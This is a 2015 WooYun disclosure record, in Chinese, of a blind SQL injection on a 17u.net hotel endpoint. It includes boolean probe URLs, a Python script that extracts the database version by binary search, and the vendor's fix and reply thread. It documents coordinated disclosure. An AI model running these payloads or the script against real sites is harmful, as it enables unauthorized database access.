{"id": 43605, "wybug_id": "wooyun-2015-0111282", "wybug_title": "苏州同程旅游某站点SQL盲注（非MySql测试代码）", "wybug_corp": "苏州同程旅游网络科技有限公司", "wybug_author": "loopx9", "wybug_date": "2015-05-04 12:33", "wybug_open_date": "2015-05-07 13:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-07：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 旗下站点一处sql盲注. 详细说明：  1=1有数据返回\nhttp://www.17u.net/ebookhandler/labelajax.ashx?action=gettejiahotel&cityid=53%20and(1=1)&lat=39.94831&lon=116.2933\n1=2没有数据返回:\nhttp://www.17u.net/ebookhandler/labelajax.ashx?action=gettejiahotel&cityid=53%20and(1=2)&lat=39.94831&lon=116.2933\n\n\n   漏洞证明：  验证脚本:\n#coding=utf-8import sys,urllib2import threadingfrom multiprocessing.dummy import Poolfrom multiprocessing.dummy import Lockfrom optparse import OptionParserfrom urllib2 import Request,urlopen,URLError,HTTPErrorimport urllibdef request(URL):    user_agent = { 'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10' }    req = urllib2.Request(URL, None, user_agent)            try:        request = urllib2.urlopen(req, timeout=10)            except Exception:        return 'Runtime Error'      return request.read()def binary_sqli(left, right, index):   global result   while 1:        mid = (left + right)/2        if mid == left:            lock.acquire()            result[index-1]= chr(mid)            sys.stdout.write('\\r%s' % '@@version: '+''.join(result))            sys.stdout.flush()            lock.release()            break        payload = \"(case when (ascii(substring(@@version,%s,1))<%s) then 53 else 0 end)\" % (index, mid)        html = request('http://www.17u.net/ebookhandler/labelajax.ashx?action=gettejiahotel&lat=39.94831&lon=116.2933&cityid='+urllib.quote(payload))         verify = '8a1e3931bba8427eb6409a6d7e80a4ee.jpg'        if verify in html:            right = mid        else:            left = middef multi_run_wrapper(args):    return binary_sqli(*args)                   if __name__ == '__main__':    result=list('*'*80)    lock=Lock()    args = []    for i in range(1,80):        args.append((32, 127, i))    pool = Pool(5)    out = pool.map(multi_run_wrapper, args)    pool.close()     pool.join()\n\n\n   修复方案：  你懂的.   版权声明：转载请注明来源 loopx9@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-05-04 12:38 厂商回复： 感谢关注同程旅游 最新状态： 2015-05-07：已修复，切了软WAF，请洞主回一下联系方式。  ", "replys": "漏洞评价：\n评论\n     2015-05-07 13:49 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  洞主联系方式。估计要查水表……    \n     2015-05-07 15:16 |    \t\t苏州同程旅游网络科技有限公司(乌云厂商)\t\t \n  @明月影 只是要手机号发京东礼品卡，你翻一下我们过去的漏洞就知道了，有白帽子确认收到的。    \n     2015-05-07 20:41 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  @苏州同程旅游网络科技有限公司 好厂商啊……    \n     2015-05-11 09:22 |    \t\t纳米翡翠 \t\t\t( 普通白帽子  |\t\t\t        Rank:316 漏洞数:42        | 翡翠虽小、价值极高，追求极致、共建安全)\t\t \n  @明月影 的确有。    \n     2015-05-16 18:43 |    \t\t糖剩七颗 \t\t\t( 普通白帽子  |\t\t\t        Rank:430 漏洞数:61        | 天涯何处无屌丝)\t\t \n  没触发到waf吗？    \n     2015-05-17 17:17 |    \t\t苏州同程旅游网络科技有限公司(乌云厂商)\t\t \n  @糖剩七颗 不是全站在软WAF上的，这个location不在    \n     2015-05-21 14:13 |    \t\tloopx9 \t\t\t( 核心白帽子 |\t\t\t        Rank:602 漏洞数:62        | ..)\t\t \n  @苏州同程旅游网络科技有限公司 礼品卡已收到    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}